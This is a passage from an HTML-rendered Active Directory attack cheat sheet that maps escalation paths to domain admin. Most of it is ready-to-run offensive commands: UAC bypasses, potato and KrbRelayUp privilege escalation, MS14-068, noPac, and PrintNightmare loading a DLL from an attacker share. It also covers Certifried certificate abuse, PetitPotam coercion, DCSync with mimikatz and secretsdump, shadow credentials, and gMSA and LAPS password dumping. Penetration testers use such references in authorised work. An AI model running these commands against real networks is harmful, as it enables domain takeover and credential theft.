paths</p><p></p><p>C:\Windows\Temp</p><p></p><p>C:\Windows\Tasks</p></div><div class='page'><a name="Domain_Dominance--Low_Access_(priv_esc)--UAC_bypass_1030.html"></a><h1 class='title level-3'>UAC bypass</h1><br/><p># Low access (Privilege escalation)</p><p>## UAC bypass &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p></p><p>Fodhelper.exe</p><p></p><p>wsreset.exe</p><p></p><p>msdt.exe</p></div><div class='page'><a name="Domain_Dominance--Low_Access_(priv_esc)--Auto_Enum_1031.html"></a><h1 class='title level-3'>Auto Enum</h1><br/><p># Low access (Privilege escalation)</p><p>## Auto Enum &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p></p><p>winPEASany_ofs.exe</p><p></p><p>.\PrivescCheck.ps1;  Invoke-PrivescCheck -Extended&quot;</p></div><div class='page'><a name="Domain_Dominance--Low_Access_(priv_esc)--Search_files_1032.html"></a><h1 class='title level-3'>Search files</h1><br/><p># Low access (Privilege escalation)</p><p>## Search files &gt;&gt;&gt; User Account [<a href="#Domain_Dominance--Valid_User_(no_password)_968.html">Valid User (no password)</a>]</p><p></p><p>findstr /si &#39;pass&#39; *.txt *.xml *.docx *.ini</p></div><div class='page'><a name="Domain_Dominance--Low_Access_(priv_esc)--Exploit_1033.html"></a><h1 class='title level-3'>Exploit</h1><br/><p># Low access (Privilege escalation)</p><p>## Exploit &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p></p><p>SMBGhost CVE-2020-0796 @CVE@</p><p></p><p>CVE-2021-36934 (HiveNightmare/SeriousSAM) @CVE@</p><p>&gt;&gt;	vssadmin list shadows</p></div><div class='page'><a name="Domain_Dominance--Low_Access_(priv_esc)--Webdav_1034.html"></a><h1 class='title level-3'>Webdav</h1><br/><p># Low access (Privilege escalation)</p><p>## Webdav &gt;&gt;&gt; HTTP Coerce [<a href="#Domain_Dominance--Man-in-the-Middle_(MitM)_969.html">Man-in-the-Middle (MitM)</a>]</p><p></p><p>open file &lt;file&gt;.searchConnector-ms</p><p>&gt;&gt;	dnstool.py -u &lt;domain&gt;\&lt;user&gt; -p &lt;pass&gt; --record &#39;attacker&#39; --action add --data &lt;ip_attacker&gt; &lt;dc_ip&gt;</p><p>	&gt;&gt;	petitpotam.py -u &#39;&lt;user&gt;&#39; -p &lt;pass&gt; -d &#39;&lt;domain&gt;&#39; &quot;attacker@80/random.txt&quot; &lt;ip&gt; &gt;&gt;&gt; HTTP Coerce [<a href="#Domain_Dominance--Man-in-the-Middle_(MitM)_969.html">Man-in-the-Middle (MitM)</a>]</p></div><div class='page'><a name="Domain_Dominance--Low_Access_(priv_esc)--Kerberos_Relay_1035.html"></a><h1 class='title level-3'>Kerberos Relay</h1><br/><p># Low access (Privilege escalation)</p><p>## Kerberos Relay &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p></p><p>KrbRelayUp.exe relay -Domain &lt;domain&gt; -CreateNewComputerAccount -ComputerName &lt;computer$&gt; -ComputerPassword &lt;password&gt;</p><p>&gt;&gt;	KrbRelayUp.exe spawn -m rbcd -d &lt;domain&gt; -dc &lt;dc&gt; -cn &lt;computer_name&gt;-cp &lt;omputer_pass&gt; &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p></div><div class='page'><a name="Domain_Dominance--Low_Access_(priv_esc)--From_Service_account_(SEImpersonate)_1036.html"></a><h1 class='title level-3'>From Service account (SEImpersonate)</h1><br/><p># Low access (Privilege escalation)</p><p>## From Service account (SEImpersonate) &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p></p><p>RoguePatato @CVE@</p><p></p><p>GodPotato @CVE@</p><p></p><p>PrintSpoofer @CVE@</p><p></p><p>RemotePotato0</p></div><div class='page'><a name="Domain_Dominance--Known_Vulnerabilities_(Authenticated)_973.html"></a><h1 class='title level-2'>Known Vulnerabilities (Authenticated)</h1><br/><p><ul><li>MS14-068 exploit (<code>ms14-068.py</code>, <code>goldenPac</code>)</li></ul></p><p> • <strong>Intent:</strong> Forge PAC in Kerberos ticket.</p><p> • <strong>Purpose:</strong> Elevate to DA.</p><p><ul><li>GPP cpassword (<code>Get-GPPPassword.py</code>, <code>findstr ... cpassword</code>)</li></ul></p><p> • <strong>Intent:</strong> Extract stored Group Policy Preferences passwords.</p><p> • <strong>Purpose:</strong> Gain cleartext creds.</p><p><ul><li>PrivExchange</li></ul></p><p> • <strong>Intent:</strong> Abuse EWS to coerce auth to attacker.</p><p> • <strong>Purpose:</strong> Relay NTLM → escalate.</p><p><ul><li>noPac</li></ul></p><p> • <strong>Intent:</strong> Abuse SamAccountName spoofing.</p><p> • <strong>Purpose:</strong> Forge tickets → DA.</p><p><ul><li>PrintNightmare</li></ul></p><p> • <strong>Intent:</strong> Exploit spooler service RCE.</p><p> • <strong>Purpose:</strong> Run code as SYSTEM.</p><p><ul><li>Certifried</li></ul></p><p> • <strong>Intent:</strong> Abuse ADCS misconfig CVE-2022-26923.</p><p> • <strong>Purpose:</strong> Request certs as DC account → escalate.</p><p><ul><li>ProxyNotShell</li></ul></p><p> • <strong>Intent:</strong> Exploit Exchange SSRF + RCE.</p><p> • <strong>Purpose:</strong> Execute commands as SYSTEM.</p><p></p></div><div class='page'><a name="Domain_Dominance--Known_Vulnerabilities_(Authenticated)--MS14-068_1037.html"></a><h1 class='title level-3'>MS14-068</h1><br/><p># Know vulnerabilities authenticated</p><p>## MS14-068 &gt;&gt;&gt; PTT [<a href="#Domain_Dominance--Lateral_Movement--NT_Hash--Pass_the_Hash_1241.html">Pass the Hash</a>] &gt;&gt;&gt; Domain admin [<a href="#Domain_Dominance--Domain_Admin_980.html">Domain Admin</a>] || Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p></p><p>findSMB2UPTime.py &lt;ip&gt;`</p><p>&gt;&gt;	ms14-068.py -u &lt;user&gt;@&lt;domain&gt; -p &lt;password&gt; -s &lt;user_sid&gt; -d &lt;dc_fqdn&gt;`</p><p>&gt;&gt;	msf&gt; use auxiliary/admin/kerberos/ms14_068_kerberos_checksum`</p><p>&gt;&gt;	goldenPac.py -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@target`</p><p>&gt;&gt;&gt;  PTT [<a href="#Domain_Dominance--Lateral_Movement--NT_Hash--Pass_the_Hash_1241.html">Pass the Hash</a>] &gt;&gt;&gt; Domain admin [<a href="#Domain_Dominance--Domain_Admin_980.html">Domain Admin</a>] || Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p></div><div class='page'><a name="Domain_Dominance--Known_Vulnerabilities_(Authenticated)--GPP_MS14-025_1038.html"></a><h1 class='title level-3'>GPP MS14-025</h1><br/><p># Know vulnerabilities authenticated</p><p>## GPP MS14-025 &gt;&gt;&gt; Domain admin [<a href="#Domain_Dominance--Domain_Admin_980.html">Domain Admin</a>]</p><p></p><p>msf&gt; use auxiliary/scanner/smb/smb_enum_gpp</p><p></p><p>findstr /S /I cpassword \\&lt;domain_fqdn&gt;\sysvol\&lt;domain_fqdn&gt;\policies\*.xml</p><p></p><p>Get-GPPPassword.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;dc_fqdn&gt;</p></div><div class='page'><a name="Domain_Dominance--Known_Vulnerabilities_(Authenticated)--PrivExchange_(CVE-2019-0724,_CVE-2019-0686)_1039.html"></a><h1 class='title level-3'>PrivExchange (CVE-2019-0724, CVE-2019-0686)</h1><br/><p># Know vulnerabilities authenticated</p><p>## PrivExchange (CVE-2019-0724, CVE-2019-0686) &gt;&gt;&gt; HTTP Coerce [<a href="#Domain_Dominance--Man-in-the-Middle_(MitM)_969.html">Man-in-the-Middle (MitM)</a>] &gt;&gt;&gt; Domain admin [<a href="#Domain_Dominance--Domain_Admin_980.html">Domain Admin</a>] || Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p></p><p>privexchange.py -ah &lt;attacker_ip&gt; &lt;exchange_host&gt; -u &lt;user&gt; -d &lt;domain&gt; -p &lt;password&gt;</p></div><div class='page'><a name="Domain_Dominance--Known_Vulnerabilities_(Authenticated)--noPac_(CVE-2021-42287,_CVE-2021-42278)_1040.html"></a><h1 class='title level-3'>noPac (CVE-2021-42287, CVE-2021-42278)</h1><br/><p># Know vulnerabilities authenticated</p><p>## noPac (CVE-2021-42287, CVE-2021-42278) &gt;&gt;&gt; PTT [<a href="#Domain_Dominance--Lateral_Movement--NT_Hash--Pass_the_Hash_1241.html">Pass the Hash</a>] &gt;&gt;&gt; DCSYNC [<a href="#Domain_Dominance--ACLs-ACEs_Permissions--Dcsync_1044.html">Dcsync</a>] &gt;&gt;&gt; Domain admin [<a href="#Domain_Dominance--Domain_Admin_980.html">Domain Admin</a>]</p><p></p><p>nxc smb &lt;ip&gt; -u &#39;user&#39; -p &#39;pass&#39; -M nopac #scan</p><p></p><p>noPac.exe -domain &lt;domain&gt; -user &lt;user&gt; -pass &lt;password&gt; /dc &lt;dc_fqdn&gt; /mAccount &lt;machine_account&gt; /mPassword &lt;machine_password&gt; /service cifs /ptt</p></div><div class='page'><a name="Domain_Dominance--Known_Vulnerabilities_(Authenticated)--PrintNightmare_(CVE-2021-1675,_CVE-2021-34527)_1041.html"></a><h1 class='title level-3'>PrintNightmare (CVE-2021-1675, CVE-2021-34527)</h1><br/><p># Know vulnerabilities authenticated</p><p>## PrintNightmare (CVE-2021-1675, CVE-2021-34527) &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p></p><p>nxc smb &lt;ip&gt; -u &#39;user&#39; -p &#39;pass&#39; -M printnightmare #scan</p><p></p><p>printnightmare.py -dll &#39;\\&lt;attacker_ip&gt;\smb\add_user.dll&#39; &#39;&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;&#39;</p></div><div class='page'><a name="Domain_Dominance--Known_Vulnerabilities_(Authenticated)--Certifried_(CVE-2022-26923)_1042.html"></a><h1 class='title level-3'>Certifried (CVE-2022-26923)</h1><br/><p># Know vulnerabilities authenticated</p><p>## Certifried (CVE-2022-26923) &gt;&gt;&gt; PTT [<a href="#Domain_Dominance--Lateral_Movement--NT_Hash--Pass_the_Hash_1241.html">Pass the Hash</a>] &gt;&gt;&gt; DCSYNC [<a href="#Domain_Dominance--ACLs-ACEs_Permissions--Dcsync_1044.html">Dcsync</a>] &gt;&gt;&gt; Domain admin [<a href="#Domain_Dominance--Domain_Admin_980.html">Domain Admin</a>]<ul><li>Create account</li></ul></p><p>  - `certipy account create -u &lt;user&gt;@&lt;domain&gt; -p &#39;&lt;password&gt;&#39; -user &#39;certifriedpc&#39; -pass &#39;certifriedpass&#39; -dns &#39;&lt;fqdn_dc&gt;&#39;`<ul><li>Request</li></ul></p><p>  - `certipy req -u &#39;certifriedpc$&#39;@&lt;domain&gt; -p &#39;certifriedpass&#39; -target &lt;ca_fqdn&gt; -ca &lt;ca_name&gt; -template Machine`<ul><li>Authentication</li></ul></p><p>  - `certipy auth -pfx &lt;pfx_file&gt; -username &#39;&lt;dc&gt;$&#39; -domain &lt;domain&gt; -dc-ip &lt;dc_ip&gt;`</p></div><div class='page'><a name="Domain_Dominance--Known_Vulnerabilities_(Authenticated)--Certifried_(CVE-2022-26923)--Create_Account_1172.html"></a><h1 class='title level-4'>Create Account</h1><br/><p># Know vulnerabilities authenticated</p><p>## Certifried (CVE-2022-26923) &gt;&gt;&gt; PTT [<a href="#Domain_Dominance--Lateral_Movement--NT_Hash--Pass_the_Hash_1241.html">Pass the Hash</a>] &gt;&gt;&gt; DCSYNC [<a href="#Domain_Dominance--ACLs-ACEs_Permissions--Dcsync_1044.html">Dcsync</a>] &gt;&gt;&gt; Domain admin [<a href="#Domain_Dominance--Domain_Admin_980.html">Domain Admin</a>]</p><p>### Create account</p><p></p><p>certipy account create -u &lt;user&gt;@&lt;domain&gt; -p &#39;&lt;password&gt;&#39; -user &#39;certifriedpc&#39; -pass &#39;certifriedpass&#39; -dns &#39;&lt;fqdn_dc&gt;&#39; &gt;&gt;&gt; Request [<a href="#Domain_Dominance--Known_Vulnerabilities_(Authenticated)--Certifried_(CVE-2022-26923)--Request_1173.html">Request</a>]</p></div><div class='page'><a name="Domain_Dominance--Known_Vulnerabilities_(Authenticated)--Certifried_(CVE-2022-26923)--Request_1173.html"></a><h1 class='title level-4'>Request</h1><br/><p># Know vulnerabilities authenticated</p><p>## Certifried (CVE-2022-26923) &gt;&gt;&gt; PTT [<a href="#Domain_Dominance--Lateral_Movement--NT_Hash--Pass_the_Hash_1241.html">Pass the Hash</a>] &gt;&gt;&gt; DCSYNC [<a href="#Domain_Dominance--ACLs-ACEs_Permissions--Dcsync_1044.html">Dcsync</a>] &gt;&gt;&gt; Domain admin [<a href="#Domain_Dominance--Domain_Admin_980.html">Domain Admin</a>]</p><p>### Request</p><p></p><p>certipy req -u &#39;certifriedpc$&#39;@&lt;domain&gt; -p &#39;certifriedpass&#39; -target &lt;ca_fqdn&gt; -ca &lt;ca_name&gt; -template Machine &gt;&gt;&gt; Authentication [<a href="#Domain_Dominance--Known_Vulnerabilities_(Authenticated)--Certifried_(CVE-2022-26923)--Authentication_1174.html">Authentication</a>]</p></div><div class='page'><a name="Domain_Dominance--Known_Vulnerabilities_(Authenticated)--Certifried_(CVE-2022-26923)--Authentication_1174.html"></a><h1 class='title level-4'>Authentication</h1><br/><p># Know vulnerabilities authenticated</p><p>## Certifried (CVE-2022-26923) &gt;&gt;&gt; PTT [<a href="#Domain_Dominance--Lateral_Movement--NT_Hash--Pass_the_Hash_1241.html">Pass the Hash</a>] &gt;&gt;&gt; DCSYNC [<a href="#Domain_Dominance--ACLs-ACEs_Permissions--Dcsync_1044.html">Dcsync</a>] &gt;&gt;&gt; Domain admin [<a href="#Domain_Dominance--Domain_Admin_980.html">Domain Admin</a>]</p><p>### Authentication</p><p></p><p>certipy auth -pfx &lt;pfx_file&gt; -username &#39;&lt;dc&gt;$&#39; -domain &lt;domain&gt; -dc-ip &lt;dc_ip&gt;</p><p>&gt;&gt;&gt; PTT [<a href="#Domain_Dominance--Lateral_Movement--NT_Hash--Pass_the_Hash_1241.html">Pass the Hash</a>] &gt;&gt;&gt; DCSYNC [<a href="#Domain_Dominance--ACLs-ACEs_Permissions--Dcsync_1044.html">Dcsync</a>] &gt;&gt;&gt; Domain admin [<a href="#Domain_Dominance--Domain_Admin_980.html">Domain Admin</a>]</p></div><div class='page'><a name="Domain_Dominance--Known_Vulnerabilities_(Authenticated)--ProxyNotShell_(CVE-2022-41040,_CVE-2022-41082)_1043.html"></a><h1 class='title level-3'>ProxyNotShell (CVE-2022-41040, CVE-2022-41082)</h1><br/><p># Know vulnerabilities authenticated</p><p>## ProxyNotShell (CVE-2022-41040, CVE-2022-41082) &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p></p><p>poc_aug3.py &lt;host&gt; &lt;username&gt; &lt;password&gt; &lt;command&gt;</p></div><div class='page'><a name="Domain_Dominance--ACLs-ACEs_Permissions_974.html"></a><h1 class='title level-2'>ACLs/ACEs Permissions</h1><br/><p><ul><li><code>mimikatz lsadump::dcsync ...</code> / <code>secretsdump.py ...</code></li></ul></p><p> • <strong>Intent:</strong> Use replication privileges to dump AD secrets (mimic a DC).</p><p> • <strong>Purpose:</strong> Extract NTLM hashes / krbtgt to escalate (→ Domain Admin / Crack hashes).</p><p><ul><li><code>certipy shadow auto ...</code> / <code>pywhisker.py ...</code></li></ul></p><p> • <strong>Intent:</strong> Abuse msDS-KeyCredentialLink to add malicious key creds.</p><p> • <strong>Purpose:</strong> Establish shadow credentials for persistence or escalation (→ Shadow Credentials).</p><p><ul><li>Group rights (GenericAll/WriteOwner/WriteDACL)</li></ul></p><p> • <strong>Intent:</strong> Modify AD group memberships or ACLs.</p><p> • <strong>Purpose:</strong> Escalate privileges by granting self admin rights.</p><p><ul><li>Computer object rights (GenericAll / GenericWrite)</li></ul></p><p> • <strong>Intent:</strong> Abuse msDS-AllowedToActOnBehalf or KeyCreds.</p><p> • <strong>Purpose:</strong> Set up RBCD or shadow creds for lateral movement.</p><p><ul><li>User object rights</li></ul></p><p> • <strong>Intent:</strong> Change password, add SPN, add key creds, or modify login script.</p><p> • <strong>Purpose:</strong> Take over accounts, enable kerberoasting, persist.</p><p><ul><li>OU object rights / GPO control</li></ul></p><p> • <strong>Intent:</strong> Abuse delegation over OUs or GPOs.</p><p> • <strong>Purpose:</strong> Escalate or persist by forcing policy changes.</p><p><ul><li><code>gMSADumper.py</code> / <code>nxc ldap ... --gmsa</code></li></ul></p><p> • <strong>Intent:</strong> Extract Group Managed Service Account secrets.</p><p> • <strong>Purpose:</strong> Obtain privileged creds for lateral movement.</p><p><ul><li>LAPS password reads (<code>Get-LapsADPassword</code>, <code>ldeep</code>, etc.)</li></ul></p><p> • <strong>Intent:</strong> Pull Local Admin Password Solution secrets.</p><p> • <strong>Purpose:</strong> Use local admin creds to escalate (→ Admin).</p><p><ul><li>GPO ACL checks (<code>Get-DomainObjectAcl</code>, <code>Get-DomainOU</code>)</li></ul></p><p> • <strong>Intent:</strong> Enumerate who can write GPOs or links.</p><p> • <strong>Purpose:</strong> Identify privilege escalation paths.</p><p><ul><li>DNSAdmins abuse (<code>dnscmd.exe ...</code>)</li></ul></p><p> • <strong>Intent:</strong> Load DLL as DNS plugin.</p><p> • <strong>Purpose:</strong> Run code as SYSTEM on DNS server (→ Admin).</p><p></p></div><div class='page'><a name="Domain_Dominance--ACLs-ACEs_Permissions--Dcsync_1044.html"></a><h1 class='title level-3'>Dcsync</h1><br/><p># ACLs/ACEs permissions</p><p>## Dcsync [<a href="#Domain_Dominance--ACLs-ACEs_Permissions--Dcsync_1044.html">Dcsync</a>] &gt;&gt;&gt; Domain Admin [<a href="#Domain_Dominance--Domain_Admin_980.html">Domain Admin</a>] || Lateral move [<a href="#Domain_Dominance--Lateral_Movement_979.html">Lateral Movement</a>] || Crack hash [<a href="#Domain_Dominance--Crack_Hashes_970.html">Crack Hashes</a>]</p><p>### Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts</p><p></p><p>mimikatz lsadump::dcsync /domain:&lt;target_domain&gt; /user:&lt;target_domain&gt;\administrator</p><p></p><p>secretsdump.py &#39;&lt;domain&gt;&#39;/&#39;&lt;user&gt;&#39;:&#39;&lt;password&gt;&#39;@&#39;&lt;domain_controller&gt;&#39;</p></div><div class='page'><a name="Domain_Dominance--ACLs-ACEs_Permissions--Can_change_msDS-KeyCredentialLInk_(Generic_Write)_+_ADCS_1045.html"></a><h1 class='title level-3'>Can change msDS-KeyCredentialLInk (Generic Write) + ADCS</h1><br/><p># ACLs/ACEs permissions</p><p>## Can change msDS-KeyCredentialLInk (Generic Write) + ADCS [<a href="#Domain_Dominance--ADCS_976.html">ADCS</a>] &gt;&gt;&gt; PassTheCertificate [<a href="#Domain_Dominance--Lateral_Movement--Certificate_(pfx)--Pass_the_certificate_1251.html">Pass the certificate</a>]</p><p><ul><li>Shadow Credentials</li></ul></p><p>  - `certipy shadow auto &#39;-u &lt;user&gt;@&lt;domain&gt;&#39; -p &lt;password&gt; -account &#39;&lt;target_account&gt;&#39;`</p><p>  - `pywhisker.py -d &quot;FQDN_DOMAIN&quot; -u &quot;user1&quot; -p &quot;CERTIFICATE_PASSWORD&quot; --target &quot;TARGET_SAMNAME&quot; --action &quot;list&quot;`</p></div><div class='page'><a name="Domain_Dominance--ACLs-ACEs_Permissions--Can_change_msDS-KeyCredentialLInk_(Generic_Write)_+_ADCS--Shadow_Credentials_1175.html"></a><h1 class='title level-4'>Shadow Credentials</h1><br/><p># ACLs/ACEs permissions</p><p>## Can change msDS-KeyCredentialLInk (Generic Write) + ADCS [<a href="#Domain_Dominance--ADCS_976.html">ADCS</a>] &gt;&gt;&gt; PassTheCertificate [<a href="#Domain_Dominance--Lateral_Movement--Certificate_(pfx)--Pass_the_certificate_1251.html">Pass the certificate</a>]</p><p>### Shadow Credentials</p><p></p><p>certipy shadow auto &#39;-u &lt;user&gt;@&lt;domain&gt;&#39; -p &lt;password&gt; -account &#39;&lt;target_account&gt;&#39;</p><p></p><p>pywhisker.py -d &quot;FQDN_DOMAIN&quot; -u &quot;user1&quot; -p &quot;CERTIFICATE_PASSWORD&quot; --target &quot;TARGET_SAMNAME&quot; --action &quot;list&quot;</p></div><div class='page'><a name="Domain_Dominance--ACLs-ACEs_Permissions--On_Group_1046.html"></a><h1 class='title level-3'>On Group</h1><br/><p># ACLs/ACEs permissions</p><p></p><p>## On Group<ul><li>GenericAll/GenericWrite/Self/Add Extended Rights</li></ul></p><p>  - Add member to the group<ul><li>Write Owner</li></ul></p><p>  - Grant Ownership<ul><li>WriteDACL + WriteOwner</li></ul></p><p>  - Grant rights</p><p>    - Give yourself generic all</p></div><div class='page'><a name="Domain_Dominance--ACLs-ACEs_Permissions--On_Group--GenericAll-GenericWrite-Self-Add_Extended_Rights_1176.html"></a><h1 class='title level-4'>GenericAll/GenericWrite/Self/Add Extended Rights</h1><br/><p># ACLs/ACEs permissions</p><p>## On Group</p><p>### GenericAll/GenericWrite/Self/Add Extended Rights</p><p></p><p>Add member to the group</p></div><div class='page'><a name="Domain_Dominance--ACLs-ACEs_Permissions--On_Group--Write_Owner_1177.html"></a><h1 class='title level-4'>Write Owner</h1><br/><p># ACLs/ACEs permissions</p><p>## On Group</p><p>### Write Owner</p><p></p><p>Grant Ownership</p></div><div class='page'><a name="Domain_Dominance--ACLs-ACEs_Permissions--On_Group--WriteDACL_+_WriteOwner_1178.html"></a><h1 class='title level-4'>WriteDACL + WriteOwner</h1><br/><p># ACLs/ACEs permissions</p><p>## On Group</p><p>### WriteDACL + WriteOwner</p><p></p><p>Grant rights</p></div><div class='page'><a name="Domain_Dominance--ACLs-ACEs_Permissions--On_Computer_1047.html"></a><h1 class='title level-3'>On Computer</h1><br/><p># ACLs/ACEs permissions</p><p>## On Computer</p><p>### GenericAll / GenericWrite</p><p></p><p>msDs-AllowedToActOnBehalf &gt;&gt;&gt; RBCD [<a href="#Domain_Dominance--Kerberos_Delegation--Resource-Based_Constrained_Delegation_1058.html">Resource-Based Constrained Delegation</a>]</p><p></p><p>add Key Credentials &gt;&gt;&gt; shadow credentials [<a href="#Domain_Dominance--Lateral_Movement_979.html">Lateral Movement</a>]</p></div><div class='page'><a name="Domain_Dominance--ACLs-ACEs_Permissions--On_User_1048.html"></a><h1 class='title level-3'>On User</h1><br/><p># ACLs/ACEs permissions</p><p></p><p>## On User<ul><li>GenericAll / GenericWrite</li></ul></p><p>  - Change password</p><p>    - `net user &lt;user&gt; &lt;password&gt; /domain` &gt;&gt;&gt; User with clear text pass [<a href="#Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)_971.html">Valid Credentials (cleartext, NT hash, Kerberos ticket)</a>]</p><p>  - add SPN (target kerberoasting)</p><p>    - `targetedKerberoast.py -d &lt;domain&gt; -u &lt;user&gt; -p &lt;pass&gt;` &gt;&gt;&gt; Hash found (TGS) [<a href="#Domain_Dominance--Crack_Hashes_970.html">Crack Hashes</a>]</p><p>  - add key credentials &gt;&gt;&gt; shadow credentials [<a href="#Domain_Dominance--Lateral_Movement_979.html">Lateral Movement</a>]</p><p>  - login script &gt;&gt;&gt; Access [<a href="#Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)_971.html">Valid Credentials (cleartext, NT hash, Kerberos ticket)</a>]<ul><li>ForceChangePassword</li></ul></p><p>  - `net user &lt;user&gt; &lt;password&gt; /domain` &gt;&gt;&gt; User with clear text pass [<a href="#Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)_971.html">Valid Credentials (cleartext, NT hash, Kerberos ticket)</a>]</p></div><div class='page'><a name="Domain_Dominance--ACLs-ACEs_Permissions--On_User--GenericAll_-_GenericWrite_1179.html"></a><h1 class='title level-4'>GenericAll / GenericWrite</h1><br/><p># ACLs/ACEs permissions</p><p>## On User</p><p>### GenericAll / GenericWrite</p><p>  - Change password</p><p>    - `net user &lt;user&gt; &lt;password&gt; /domain` &gt;&gt;&gt; User with clear text pass [<a href="#Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)_971.html">Valid Credentials (cleartext, NT hash, Kerberos ticket)</a>]</p><p>  - add SPN (target kerberoasting)</p><p>    - `targetedKerberoast.py -d &lt;domain&gt; -u &lt;user&gt; -p &lt;pass&gt;` &gt;&gt;&gt; Hash found (TGS) [<a href="#Domain_Dominance--Crack_Hashes_970.html">Crack Hashes</a>]</p><p>  - add key credentials &gt;&gt;&gt; shadow credentials [<a href="#Domain_Dominance--Lateral_Movement_979.html">Lateral Movement</a>]</p><p>  - login script &gt;&gt;&gt; Access [<a href="#Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)_971.html">Valid Credentials (cleartext, NT hash, Kerberos ticket)</a>]</p></div><div class='page'><a name="Domain_Dominance--ACLs-ACEs_Permissions--On_User--GenericAll_-_GenericWrite--Change_password_1181.html"></a><h1 class='title level-5'>Change password</h1><br/><p># ACLs/ACEs permissions</p><p>## On User</p><p>### GenericAll / GenericWrite</p><p>#### Change password</p><p></p><p>net user &lt;user&gt; &lt;password&gt; /domain &gt;&gt;&gt; User with clear text pass [<a href="#Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)_971.html">Valid Credentials (cleartext, NT hash, Kerberos ticket)</a>]</p></div><div class='page'><a name="Domain_Dominance--ACLs-ACEs_Permissions--On_User--GenericAll_-_GenericWrite--Add_SPN_(target_kerberoasting)_1182.html"></a><h1 class='title level-5'>Add SPN (target kerberoasting)</h1><br/><p># ACLs/ACEs permissions</p><p>## On User</p><p>### GenericAll / GenericWrite</p><p>#### Add SPN (target kerberoasting)</p><p></p><p>targetedKerberoast.py -d &lt;domain&gt; -u &lt;user&gt; -p &lt;pass&gt; &gt;&gt;&gt; Hash found (TGS) [<a href="#Domain_Dominance--Crack_Hashes_970.html">Crack Hashes</a>]</p></div><div class='page'><a name="Domain_Dominance--ACLs-ACEs_Permissions--On_User--GenericAll_-_GenericWrite--Add_key_credentials_1183.html"></a><h1 class='title level-5'>Add key credentials</h1><br/><p># ACLs/ACEs permissions</p><p>## On User</p><p>### GenericAll / GenericWrite</p><p>#### Add key credentials &gt;&gt;&gt; shadow credentials [<a href="#Domain_Dominance--Lateral_Movement_979.html">Lateral Movement</a>]</p></div><div class='page'><a name="Domain_Dominance--ACLs-ACEs_Permissions--On_User--GenericAll_-_GenericWrite--Login_script_1184.html"></a><h1 class='title level-5'>Login script</h1><br/><p># ACLs/ACEs permissions</p><p>## On User</p><p>### GenericAll / GenericWrite</p><p>#### Login script &gt;&gt;&gt; Access [<a href="#Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)_971.html">Valid Credentials (cleartext, NT hash, Kerberos ticket)</a>]</p></div><div class='page'><a name="Domain_Dominance--ACLs-ACEs_Permissions--On_User--ForceChangePassword_1180.html"></a><h1 class='title level-4'>ForceChangePassword</h1><br/><p># ACLs/ACEs permissions</p><p>## On User</p><p>### ForceChangePassword</p><p></p><p>net user &lt;user&gt; &lt;password&gt; /domain &gt;&gt;&gt; User with clear text pass [<a href="#Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)_971.html">Valid Credentials (cleartext, NT hash, Kerberos ticket)</a>]</p></div><div class='page'><a name="Domain_Dominance--ACLs-ACEs_Permissions--On_OU_1049.html"></a><h1 class='title level-3'>On OU</h1><br/><p># ACLs/ACEs permissions</p><p></p><p>## On OU<ul><li>Write Dacl</li></ul></p><p>  - ACE Inheritance</p><p>    - Grant rights<ul><li>GenericAll / GenericWrite / Manage Group Policy Links</li></ul></p><p>  - `OUned.py --config config.ini`</p></div><div class='page'><a name="Domain_Dominance--ACLs-ACEs_Permissions--On_OU--Write_Dacl_1185.html"></a><h1 class='title level-4'>Write Dacl</h1><br/><p># ACLs/ACEs permissions</p><p>## On OU</p><p>### Write Dacl</p><p></p><p>ACE Inheritance</p><p>&gt;&gt;	Grant rights</p><p></p></div><div class='page'><a name="Domain_Dominance--ACLs-ACEs_Permissions--On_OU--GenericAll_-_GenericWrite_-_Manage_Group_Policy_Links_1186.html"></a><h1 class='title level-4'>GenericAll / GenericWrite / Manage Group Policy Links</h1><br/><p># ACLs/ACEs permissions</p><p>## On OU</p><p>### GenericAll / GenericWrite / Manage Group Policy Links</p><p> </p><p>OUned.py --config config.ini</p></div><div class='page'><a name="Domain_Dominance--ACLs-ACEs_Permissions--ReadGMSAPassword_1050.html"></a><h1 class='title level-3'>ReadGMSAPassword</h1><br/><p># ACLs/ACEs permissions</p><p>## ReadGMSAPassword</p><p></p><p>gMSADumper.py -u &#39;&lt;user&gt;&#39; -p &#39;&lt;password&gt;&#39; -d &#39;&lt;domain&gt;&#39;</p><p></p><p>nxc ldap &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; --gmsa</p><p></p><p>ldeep ldap -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -s ldaps://&lt;dc_ip&gt; gmsa</p></div><div class='page'><a name="Domain_Dominance--ACLs-ACEs_Permissions--Get_LAPS_passwords_1051.html"></a><h1 class='title level-3'>Get LAPS passwords</h1><br/><p># ACLs/ACEs permissions</p><p></p><p>## Get LAPS 